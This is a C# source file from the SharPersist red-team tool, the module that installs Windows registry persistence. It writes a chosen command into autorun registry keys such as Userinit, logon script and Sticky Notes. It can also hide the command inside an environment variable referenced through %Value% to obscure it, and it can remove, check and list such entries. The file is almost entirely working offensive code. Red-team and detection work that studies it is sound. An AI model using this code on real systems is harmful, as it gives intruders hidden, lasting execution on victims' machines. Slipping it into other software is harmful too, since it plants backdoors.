using System;
using Microsoft.Win32;


namespace SharPersist
{
    public class RegistryPersist : Persistence
    {
        public RegistryPersist(string persistMethod, string command, string commandArg, string theKey, string theVal, string theName, string filePath, string status, string option) : base(persistMethod, command, commandArg, theKey, theVal, theName, filePath, status, option)
        {
            initialize(persistMethod, command, commandArg, theKey, theVal, theName, filePath, status, option);

        }

        // initial function to decide which method needs performed and if valid args given
        public void initialize(string persistMethod, string command, string commandArg, string theKey, string theVal, string theName, string filePath, string status, string option)
        {

            // add persistence
            if (status.ToLower().Equals("add"))
            {

                // if user specifies key that already has pre-determined reg value
                if (theKey.ToLower().Equals("logonscript") || theKey.ToLower().Equals("stickynotes") || theKey.ToLower().Equals("userinit"))
                {
                    if (command.Equals("") || lib.Utils.getRegKeyMapping(theKey).Equals(""))
                    {
                        Console.WriteLine("");
                        Console.WriteLine("[-] ERROR: Must give a command and valid registry key. See help (-h).");
                        return;
                    }

                }

                // if user does not specify key that already has pre-determined reg value
                else
                {

                    if (command.Equals("") || lib.Utils.getRegKeyMapping(theKey).Equals("") || theVal.Equals(""))
                    {
                        Console.WriteLine("");
                        Console.WriteLine("[-] ERROR: Must give a command, valid registry key and value. See help (-h).");
                        return;
                    }

                }

                addPersistence(command, commandArg, theKey, theVal, option);

            } // end if adding persistence

            // remove persistence
            else if (status.ToLower().Equals("remove"))
            {


                // is user specifies key that already has pre-determined reg value
                if (theKey.ToLower().Equals("logonscript") || theKey.ToLower().Equals("stickynotes") || theKey.ToLower().Equals("userinit"))
                {
                    if (lib.Utils.getRegKeyMapping(theKey).Equals(""))
                    {
                        Console.WriteLine("");
                        Console.WriteLine("[-] ERROR: Must give a command and valid registry key. See help (-h).");
                        return;
                    }

                }

                // if user is using key that does not have pre-defined value
                else
                {

                    if (lib.Utils.getRegKeyMapping(theKey).Equals("") || theVal.Equals(""))
                    {
                        Console.WriteLine("");
                        Console.WriteLine("[-] ERROR: Must give both a valid registry key and value. See help (-h).");
                        return;
                    }
                }


                removePersistence(theKey, theVal, option);

            } // end if removing persistence

            // dry run
            else if (status.ToLower().Equals("check"))
            {
                checkPersistence(persistMethod, command, commandArg, theKey, theVal, theName, filePath, status);
            }

            // list persistence
            else if (status.ToLower().Equals("list"))
            {
                listPersistence(persistMethod, command, commandArg, theKey, theVal, theName, filePath, status);
            }

            // if invalid status given
            else
            {
                Console.WriteLine("");
                Console.WriteLine("[-] ERROR: Invalid method given. Must give add, remove, check or list. See help (-h).");
                return;
            }

        } // end intialize method


        // add persistence trigger
        public void addPersistence(string command, string commandArg, string theKey, string theVal, string option)
        {
            // get original key passed and initialize variable to track if user is using pre-determined reg value
            string origKey = theKey;
            bool preDeterminedRegValue = false;


            // if user is using pre determined reg value, get its reg value to be used throughout method
            if (origKey.ToLower().Equals("logonscript") || origKey.ToLower().Equals("stickynotes") || origKey.ToLower().Equals("userinit"))
            {
                theVal = lib.Utils.getRegValueMapping(origKey);
                preDeterminedRegValue = true;
            }

            // print info to user
            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Adding registry persistence");
            Console.WriteLine("[*] INFO: Command: " + command);
            Console.WriteLine("[*] INFO: Command Args: " + commandArg);
            Console.WriteLine("[*] INFO: Registry Key: " + lib.Utils.getRegKeyMapping(theKey));
            Console.WriteLine("[*] INFO: Registry Value: " + theVal);
            Console.WriteLine("[*] INFO: Option: " + option);
            Console.WriteLine("");

            theKey = lib.Utils.getRegKeyMapping(theKey); // get actual reg key based on key code entered by user

            // environment reg keys, will be used to hide the command exec if user gives that option
            string hkcuEnvironment = @"Environment";
            string hklmEnvironment = @"SYSTEM\CurrentControlSet\Control\Session Manager\Environment";

            // get reg hive
            string regHive = theKey.Substring(0, 4).ToUpper();
            bool regValueExists = lib.Utils.RegistryValueExists(regHive, theKey, theVal);

            bool canWrite = lib.Utils.CanWriteKey(theKey); // whether you can write to registry key

            // if you can write to registry key
            if (canWrite)
            {

                // if registry key and value value doesn't already exist, then proceed
                if (!regValueExists)
                {
                    try
                    {
                        // if hkcu
                        if (regHive.ToLower().Equals("hkcu"))
                        {

                            // if option was specified to use env variable in reg key and user did not use pre determined reg key
                            if (option.ToLower().Equals("env") && !preDeterminedRegValue)
                            {

                                // make sure reg value trying to be created in env key does not exist
                                if (!lib.Utils.RegistryValueExists("hkcu", regHive + "\\" + hkcuEnvironment, theVal))
                                {

                                    // set HKCU\Environment variable with your command exec in it
                                    RegistryKey envKey = Registry.CurrentUser.CreateSubKey(hkcuEnvironment);
                                    envKey.SetValue(theVal, command + " " + commandArg, RegistryValueKind.ExpandString);

                                    // set the actual persistence trigger reg key with %Value%
                                    theKey = theKey.ToLower().Replace("hkcu\\", "");
                                    RegistryKey key = Registry.CurrentUser.CreateSubKey(theKey);
                                    key.SetValue(theVal, "%" + theVal + "%", RegistryValueKind.ExpandString);
                                }

                                // if the reg value in env key exists, display error to user
                                else
                                {
                                    Console.WriteLine("");
                                    Console.WriteLine("[-] ERROR: That value already exists in: HKCU\\Environment. Please specify a different value.");
                                    return;
                                }

                            } // end if option was specified to use env variable in reg key

                            // if option was NOT used to specify env variable in reg key
                            else
                            {
                                // set the actual persistence trigger reg key command and arg specified
                                theKey = theKey.ToLower().Replace("hkcu\\", "");
                                RegistryKey key = Registry.CurrentUser.CreateSubKey(theKey);
                                key.SetValue(theVal, command + " " + commandArg, RegistryValueKind.String);
                            }

                        } // end if hkcu

                        // if hklm
                        else if (regHive.ToLower().Equals("hklm"))
                        {
                            // if option was specified to use env variable in reg key
                            if (option.ToLower().Equals("env"))
                            {

                                // only proceed if the associated environment variable is not present
                                if (!lib.Utils.RegistryValueExists("hklm", regHive + "\\" + hklmEnvironment, theVal))
                                {
                                    // set HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment variable with your command exec in it
                                    RegistryKey envKey = Registry.LocalMachine.CreateSubKey(hklmEnvironment);
                                    envKey.SetValue(theVal, command + " " + commandArg, RegistryValueKind.ExpandString);

                                    // set the actual persistence trigger reg key with %Value%
                                    theKey = theKey.ToLower().Replace("hklm\\", "");
                                    RegistryKey key = Registry.LocalMachine.CreateSubKey(theKey);
                                    key.SetValue(theVal, "%" + theVal + "%", RegistryValueKind.ExpandString);

                                }

                                else
                                {
                                    Console.WriteLine("");
                                    Console.WriteLine("[-] ERROR: That value already exists in: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment. Please specify a different value.");
                                    return;
                                }
                            }

                            // if env option not specified
                            else
                            {
                                // set the actual persistence trigger reg key
                                theKey = theKey.ToLower().Replace("hklm\\", "");
                                RegistryKey key = Registry.LocalMachine.CreateSubKey(theKey);
                                key.SetValue(theVal, command + " " + commandArg, RegistryValueKind.String);
                            }


                        } // end if hklm

                        else
                        {
                            Console.WriteLine("");
                            Console.WriteLine("[-] ERROR: Need to give valid registry hive.");
                            return;
                        }

                    } // end try

                    catch (System.IO.IOException ex)
                    {
                        Console.WriteLine("");
                        Console.WriteLine("[-] ERROR: Invalid permissions to touch that registry location.");
                        return;
                    }



                    Console.WriteLine("");
                    Console.WriteLine("[+] SUCCESS: Registry persistence added");

                } // end if reg key and value don't already exist

                // if registry key and value already exist, display message and return
                else
                {

                    // if user is wanting to use one of the approved/supported reg keys and values that already exists
                    if (origKey.ToLower().Equals("logonscript") || origKey.ToLower().Equals("stickynotes") || origKey.ToLower().Equals("userinit"))
                    {
                        // if user specified env option
                        if (option.ToLower().Equals("env"))
                        {
                            Console.WriteLine("");
                            Console.WriteLine("[-] ERROR: Environment variable add-on not supported with pre-determined registry values.");
                            return;
                        }


                        // if user did not specify env option
                        else
                        {
                            if (origKey.ToLower().Equals("logonscript"))
                            {

                                // set the actual persistence trigger reg key command and arg specified
                                theKey = theKey.ToLower().Replace("hkcu\\", "");
                                RegistryKey key = Registry.CurrentUser.CreateSubKey(theKey);
                                key.SetValue(theVal, command + " " + commandArg, RegistryValueKind.ExpandString);
                                key.Close();

                                Console.WriteLine("");
                                Console.WriteLine("[+] SUCCESS: Registry persistence added");


                            }

                            else if (origKey.ToLower().Equals("stickynotes"))
                            {

                                // set the actual persistence trigger reg key command and arg specified
                                theKey = theKey.ToLower().Replace("hkcu\\", "");
                                RegistryKey key = Registry.CurrentUser.CreateSubKey(theKey);
                                key.SetValue(theVal, command + " " + commandArg, RegistryValueKind.String);
                                key.Close();

                                Console.WriteLine("");
                                Console.WriteLine("[+] SUCCESS: Registry persistence added");


                            }

                            else if (origKey.ToLower().Equals("userinit"))
                            {

                                // set the actual persistence trigger reg key
                                theKey = theKey.ToLower().Replace("hklm\\", "");
                                RegistryKey key = Registry.LocalMachine.CreateSubKey(theKey);
                                key.SetValue(theVal, @"C:\Windows\System32\userinit.exe," + command + " " + commandArg, RegistryValueKind.String);
                                key.Close();

                                Console.WriteLine("");
                                Console.WriteLine("[+] SUCCESS: Registry persistence added");

                            }

                        } // end if user did not specify env option


                    } // end if user wanting to use approved/supported reg key and value that already exists


                    // if user is NOT wanting to use one of approved/supported reg keys and values that exist
                    else
                    {
                        Console.WriteLine("[-] ERROR: Registry key and value already exist");
                        return;
                    }

                } // end if registry key and value already exist

            } // end if you can write to reg key

            //if you cannot write to registry key
            else
            {
                Console.WriteLine("[-] ERROR: You do NOT have write permissions to that registry key");
                return;

            }

        } // end add persistence 


        // remove persistence trigger
        public void removePersistence(string theKey, string theVal, string option)
        {
            // get original key passed and initialize variable to track if user is using pre-determined reg value
            string origKey = theKey;
            bool preDeterminedRegValue = false;


            // if user is using pre determined reg value, get its reg value
            if (origKey.ToLower().Equals("logonscript") || origKey.ToLower().Equals("stickynotes") || origKey.ToLower().Equals("userinit"))
            {
                theVal = lib.Utils.getRegValueMapping(origKey);
                preDeterminedRegValue = true;
            }

            // print info
            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Removing registry persistence");
            Console.WriteLine("[*] INFO: Registry Key: " + lib.Utils.getRegKeyMapping(theKey));
            Console.WriteLine("[*] INFO: Registry Value: " + theVal);
            Console.WriteLine("[*] INFO: Option: " + option);
            Console.WriteLine("");


            theKey = lib.Utils.getRegKeyMapping(theKey); // get actual reg key

            // environment reg keys, will be used to hide the command exec
            string hkcuEnvironment = @"Environment";
            string hklmEnvironment = @"SYSTEM\CurrentControlSet\Control\Session Manager\Environment";


            // get reg hive
            string regHive = theKey.Substring(0, 4).ToUpper();
            bool regValueExists = lib.Utils.RegistryValueExists(regHive, theKey, theVal);
            bool canWrite = lib.Utils.CanWriteKey(theKey); // whether you can write to registry key

            // if you can write to registry key
            if (canWrite)
            {

                // if reg value exists
                if (regValueExists)
                {
                    try
                    {

                        // if hkcu
                        if (regHive.ToLower().Equals("hkcu"))
                        {

                            // if option was specified to use env variable in reg key
                            if (option.ToLower().Equals("env") && !preDeterminedRegValue)
                            {

                                // delete HKCU\Environment variable with your command exec in it
                                RegistryKey envKey = Registry.CurrentUser.CreateSubKey(hkcuEnvironment);
                                envKey.DeleteValue(theVal);

                                // delete the actual persistence trigger reg key with %Value%
                                theKey = theKey.ToLower().Replace("hkcu\\", "");
                                RegistryKey key = Registry.CurrentUser.CreateSubKey(theKey);
                                key.DeleteValue(theVal);

                            }

                            // if option for env was not used
                            else
                            {
                                // if using pre-determined reg value, the just set the value rather than delete
                                if (preDeterminedRegValue)
                                {
                                    // if using logonscript or stickynotes, delete the reg value
                                    if (origKey.ToLower().Equals("logonscript") || origKey.ToLower().Equals("stickynotes"))
                                    {
                                        theKey = theKey.ToLower().Replace("hkcu\\", "");
                                        RegistryKey keyToDelete = Registry.CurrentUser.CreateSubKey(theKey);
                                        keyToDelete.DeleteValue(theVal);
                                    }

                                    // otherwise just set reg value to blank
                                    else
                                    {
                                        theKey = theKey.ToLower().Replace("hkcu\\", "");
                                        RegistryKey key = Registry.CurrentUser.CreateSubKey(theKey);
                                        key.SetValue(theVal, "", RegistryValueKind.String);
                                    }

                                } // end if using pre-determined reg value

                                // otherwise proceed as normal
                                else
                                {
                                    // delete the actual persistence trigger reg key with system command
                                    theKey = theKey.ToLower().Replace("hkcu\\", "");
                                    RegistryKey key = Registry.CurrentUser.CreateSubKey(theKey);
                                    key.DeleteValue(theVal);
                                }

                            } // end if option for env was not used

                        } // end if hkcu

                        // if hklm
                        else if (regHive.ToLower().Equals("hklm"))
                        {
                            // if option was specified to use env variable in reg key
                            if (option.ToLower().Equals("env"))
                            {

                                // delete HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment variable with your command exec in it
                                RegistryKey envKey = Registry.LocalMachine.CreateSubKey(hklmEnvironment);
                                envKey.DeleteValue(theVal);


                                // delete the actual persistence trigger reg key with %Value%
                                theKey = theKey.ToLower().Replace("hklm\\", "");
                                RegistryKey key = Registry.LocalMachine.CreateSubKey(theKey);
                                key.DeleteValue(theVal);
                            }

                            // if env not specified
                            else
                            {

                                // if using pre-determined reg valuee
                                if (preDeterminedRegValue)
                                {
                                    // if using userinit, set value appropriately
                                    if (origKey.ToLower().Equals("userinit"))
                                    {
                                        theKey = theKey.ToLower().Replace("hklm\\", "");
                                        RegistryKey key = Registry.LocalMachine.CreateSubKey(theKey);
                                        key.SetValue(theVal, @"C:\Windows\System32\userinit.exe", RegistryValueKind.String);
                                    }

                                    // otherwise just set reg value to blank
                                    else
                                    {
                                        theKey = theKey.ToLower().Replace("hklm\\", "");
                                        RegistryKey key = Registry.LocalMachine.CreateSubKey(theKey);
                                        key.SetValue(theVal, "", RegistryValueKind.String);
                                    }


                                } // end if using pre-determined reg value

                                // otherwise proceed as normal
                                else
                                {

                                    // delete the actual persistence trigger reg key
                                    theKey = theKey.ToLower().Replace("hklm\\", "");
                                    RegistryKey key = Registry.LocalMachine.CreateSubKey(theKey);
                                    key.DeleteValue(theVal);

                                }

                            } // end if env not specified

                        } // end if hklm

                        else
                        {
                            Console.WriteLine("");
                            Console.WriteLine("[-] ERROR: Need to give valid registry hive.");
                            return;
                        }

                    }
                    catch (System.IO.IOException ex)
                    {
                        Console.WriteLine("");
                        Console.WriteLine("[-] ERROR: Invalid permissions to touch that registry location.");
                        return;
                    }

                    Console.WriteLine("");
                    Console.WriteLine("[+] SUCCESS: Registry persistence removed");

                } // end if registry value exists

                // if registry value does not exist
                else
                {
                    Console.WriteLine("");
                    Console.WriteLine("[-] ERROR: Registry key and value do not exist. Make sure you entered them right.");
                    return;
                }

            } // end if you have write perms to reg key

            // if you do not have write perms to reg key
            else
            {
                Console.WriteLine("[-] ERROR: You do NOT have write permissions to that registry key");
                return;
            }

        } // end remove persistence



        // check for persistence technique
        public void checkPersistence(string persistMethod, string command, string commandArg, string theKey, string theVal, string theName, string filePath, string status)
        {

            bool preDeterminedRegValue = false;
            string origKey = theKey;

            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Checking for correct arguments given");

            // if user wants to use pre-determined reg value
            if (theKey.ToLower().Equals("logonscript") || theKey.ToLower().Equals("stickynotes") || theKey.ToLower().Equals("userinit"))
            {
                preDeterminedRegValue = true;
                theKey = lib.Utils.getRegKeyMapping(origKey);
                

                if (command.Equals("") || theKey.Equals(""))
                {
                    Console.WriteLine("");
                    Console.WriteLine("[-] ERROR: Must give a command and valid registry key. See help (-h).");
                    return;
                }



            } // end if pre-determined reg value used

            // if user does not specify key that already has pre-determined reg value
            else
            {

                if (command.Equals("") || lib.Utils.getRegKeyMapping(theKey).Equals("") || theVal.Equals(""))
                {
                    Console.WriteLine("");
                    Console.WriteLine("[-] ERROR: Must give a command, valid registry key and value. See help (-h).");
                }

            }
            Console.WriteLine("[+] SUCCESS: Correct arguments given");


            // only check to make sure reg value doesn't exist if not using pre determined reg value
            if (!preDeterminedRegValue)
            {
                Console.WriteLine("");
                Console.WriteLine("[*] INFO: Checking if registry key and value supplied already exists");

                theKey = lib.Utils.getRegKeyMapping(theKey); // get actual reg key

                // if invalid reg key given
                if (theKey.Equals(""))
                {
                    Console.WriteLine("[-] ERROR: Invalid registry key given. Please see help (-h)");
                    return;
                }


                string regHive = theKey.Substring(0, 4).ToUpper();
                bool regValueExists = lib.Utils.RegistryValueExists(regHive, theKey, theVal);

                if (regValueExists)
                {
                    Console.WriteLine("[-] ERROR: Registry key and value already exist");
                }

                else
                {
                    Console.WriteLine("[+] SUCCESS: Registry key and value do NOT exist");
                }
            }


            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Checking if you can write to that registry location");


            bool canWrite = lib.Utils.CanWriteKey(theKey);

            if (canWrite)
            {
                Console.WriteLine("[+] SUCCESS: You have write permissions to that registry key");
            }

            else
            {
                Console.WriteLine("[-] ERROR: You do NOT have write permissions to that registry key");
            }


        } // end check persistence


        // list persistence
        public void listPersistence(string persistMethod, string command, string commandArg, string theKey, string theVal, string theName, string filePath, string status)
        {
            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Listing all registry values in: " + lib.Utils.getRegKeyMapping(theKey));
            Console.WriteLine("");
            Console.WriteLine("");
            Console.WriteLine("");


            // if reg key given is not valid
            if (lib.Utils.getRegKeyMapping(theKey).Equals(""))
            {
                Console.WriteLine("[-] ERROR: Not valid registry key. Please see help (-h).");

            }

            // if reg key is valid
            else
            {

                theKey = lib.Utils.getRegKeyMapping(theKey); // get actual reg key

                string regHive = theKey.Substring(0, 4).ToUpper();


                if (regHive.ToUpper().Equals("HKLM"))
                {
                    theKey = theKey.ToLower().Replace("hklm\\", "");


                    // try and open the registry key and get the value contained inside
                    RegistryKey key = Registry.LocalMachine.OpenSubKey(theKey);

                    string[] allValNames = key.GetValueNames();
                    foreach (string valName in allValNames)
                    {
                        Console.WriteLine("[*] INFO: REGISTRY VALUE:");
                        Console.WriteLine(valName);
                        Console.WriteLine("");
                        Console.WriteLine("[*] INFO: REGISTRY VALUE KIND:");
                        Console.WriteLine(key.GetValueKind(valName));
                        Console.WriteLine("");
                        Console.WriteLine("[*] INFO: REGISTRY DATA:");
                        Console.WriteLine(key.GetValue(valName));
                        Console.WriteLine("");

                        Console.WriteLine("");
                        Console.WriteLine("");
                        Console.WriteLine("");

                    } // end for each value in registry key


                } // end if reg hive is hklm


                // if registry hive is HKCU
                else if (regHive.ToUpper().Equals("HKCU"))
                {
                    theKey = theKey.ToLower().Replace("hkcu\\", "");

                    // try and open the registry key and get the value contained inside
                    RegistryKey key = Registry.CurrentUser.OpenSubKey(theKey);

                    string[] allValNames = key.GetValueNames();
                    foreach (string valName in allValNames)
                    {
                        Console.WriteLine("[*] INFO: REGISTRY VALUE:");
                        Console.WriteLine(valName);
                        Console.WriteLine("");
                        Console.WriteLine("[*] INFO: REGISTRY VALUE KIND:");
                        Console.WriteLine(key.GetValueKind(valName));
                        Console.WriteLine("");
                        Console.WriteLine("[*] INFO: REGISTRY DATA:");
                        Console.WriteLine(key.GetValue(valName));
                        Console.WriteLine("");

                        Console.WriteLine("");
                        Console.WriteLine("");
                        Console.WriteLine("");

                    } // end for each value in registry key


                } // end if reg hive is hkcu

            } // end if reg key is valid

        } // end list persistence method


    } // end class

} // end namespace
